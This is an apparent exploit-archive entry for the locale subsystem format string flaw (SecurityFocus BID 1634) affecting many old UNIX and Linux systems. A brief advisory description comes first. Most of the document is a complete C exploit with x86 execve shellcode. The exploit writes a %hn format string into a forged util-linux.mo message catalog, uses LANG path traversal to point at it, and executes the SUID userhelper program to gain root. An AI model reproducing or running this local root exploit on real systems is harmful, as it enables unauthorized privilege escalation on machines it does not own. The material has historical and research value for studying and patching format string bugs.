ectiva 4.x/5.x,Debian 2.x,IBM AIX 3.x/4.x,Mandrake 7,RedHat 5.x/6.x,IRIX 6.x, Solaris 2.x/7/8,Turbolinux 6.x,Wirex Immunix OS 6.2 Locale Subsystem Format String
    
source: http://www.securityfocus.com/bid/1634/info
     
Many UNIX operating systems provide internationalization support according to the X/Open XPG3, XPG4 and Sun/Uniforum specifications using the of the locale subsystem. The locale subsystem comprises a set of databases that store language and country specific information and a set of library functions used to store, retrieve and generally manage that information.
     
In particular a database with messages used by almost all the operating system programs is keep for each supported language.
     
The programs access this database using the gettext(3), dgettext(3), dcgettext(3) C functions (Sun/Uniforum specifications) or catopen(3), catgets(3) and catclose(3) ( X/Open XPG3 and XPG4 specification).
     
Generally a program that needs to display a message to the user will obtain the proper language specific string from the database using the original message as the search key and printing the results using the printf(3) family of functions. By building and installing a custom messages database an attacker can control the output of the message retrieval functions that get feed to the printf(3) functions.
     
Bad coding practices and the ability to feed format strings to the later functions makes it possible for an attacker to execute arbitrary code as a privileged user (root) using almost any SUID program on the vulnerable systems.
     
Alternatively, on some operating systems, the problem can be exploited remotely using the environment variable passing options in telnetd. However, a remote attacker must be able to place the suitable messages database on the target host (i.e. anonymous ftp, NFS, email, etc.)
     
It should be noted under Linux this problem must be exploited in conjunction with a another flaw in glibc. On RedHat systems, it is possible to evade the protection built-into libc that patches this vulnerability and exploit userhelper to gain root access. RedHat has released packages to fix this vulnerability.


#include <stdio.h>
int getesp(){__asm__("movl %esp,%eax");}
char shellcode[] = 
"\x90\x90\x31\xc0\x89\xc3\x89\xc1\xb0\x46\xcd\x80"
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/tmp/xx";

void dopercentn(char *toaddr,unsigned int startloc,unsigned int sofar,int c)
// c       =what i want in the 1st location
// startloc=pointer to successive pointers 
{
 char *bigfmt;
 int f=0;
 unsigned int buffer=0;
 unsigned int d;
 unsigned int p,q,r,s;
 int n=1;
 unsigned int thistime;
 char fmt[1000];
 f=startloc;
 bigfmt=toaddr;
 sofar=(0x100-sofar%0x100);
 thistime=(c)%0x100+(sofar);
 sprintf(fmt,"%%1$%dx%%%u$hn",thistime,f);
 strcpy(bigfmt,fmt);
 sofar=(sofar+(0x100-thistime));
 thistime=(c>>8)%0x100+(sofar);
 f++;
 sprintf(fmt,"%%1$%dx%%%u$hn",thistime,f);
 strcat(bigfmt,fmt);
 sofar=sofar+(0x100-thistime);
 thistime=(c>>16)%0x100+(sofar);
 f++;
 sprintf(fmt,"%%1$%dx%%%u$hn",thistime,f);
 strcat(bigfmt,fmt);
 sofar=sofar+(0x100-thistime);
 thistime=(c>>24)%0x100+(sofar);
 f++;
 sprintf(fmt,"%%1$%dx%%%u$hn",thistime,f);
 strcat(bigfmt,fmt);
}


main(int argc,char *argv[],char *env[])
{
 FILE *fi,*fo;
 char buf[100000],daenv[8000]; 
 char *cwd,evil[300];  
 char *localedir;
 unsigned long dasize=0,c,d=0,e=0,esp,i; 
 int o=0x0c12b;
 int dest=0xbfffff16;
 if (argc>1) d=atoi(argv[1]);
 if (d==0) d =79;
 if (argc>2) e=strtoul(argv[2],0,16);
 if (e==0) e=0xbffffdb8;
 fi=fopen("./util-linux.raw","r"); 
 if (!fi)
 {
  perror("bugger: input didn't open:");
  exit(-1);
 }
 if (mkdir("LC_MESSAGES",0755))
 {
  perror("Couldn't mkdir:");
  if (chdir("LC_MESSAGES"))
  {
   perror("chdir failed:");
   exit(-1);
  }
  chdir("..");
 }
 fo=fopen("./LC_MESSAGES/util-linux.mo","w");
 if (!fo)
 {
  perror("bugger: output didn't open:");
  exit(-1);
 }
 dasize=fread(buf,1,sizeof(buf),fi); 
 fclose(fi); 
 dopercentn(buf+o,d,0,dest);
 strcpy(evil,"01234567890123456789012345678"); 
 strcat(evil,shellcode); 
 esp=(unsigned int)(argv[0])%4;
 esp=(6-esp)%4;
 *(long*)(esp+evil)=e; 
 *(long*)(esp+evil+4)=e+1; 
 *(long*)(esp+evil+8)=e+2; 
 *(long*)(esp+evil+12)=e+3; 
 fwrite(buf,1,dasize,fo); // lazy, lazy, lazy.
 fclose(fo); 
 cwd=(char *)getcwd(0,0);
 if (!cwd)
 {
  perror("getcwd: Stop playing silly buggers. You want root, no? :");
  exit(-1);
 }
 localedir=(char*)malloc(2000);
 if (!localedir) 
 {
  perror("malloc: fuck this for a game of soldiers:");
 }
 sprintf(localedir,"en_US/../../../../../..%s",cwd);
 sprintf(daenv,"LANG=%s",localedir);
 env[0]=0x0000000;
 putenv("DISPLAY=:0.0");
 putenv(daenv);
 putenv("TERM=vt100");
 putenv("SHELL=/bin/sh");
 putenv("USER=root");
 putenv("LOGNAME=root");
 setenv("HOME",evil,1);
 printf("Using dir of: %s\n",localedir);
 execl("/usr/sbin/userhelper","/usr/sbin/userhelper","-t","-w","/sbin/kbdrate",0);
}

/* end of zen-nktb.c */
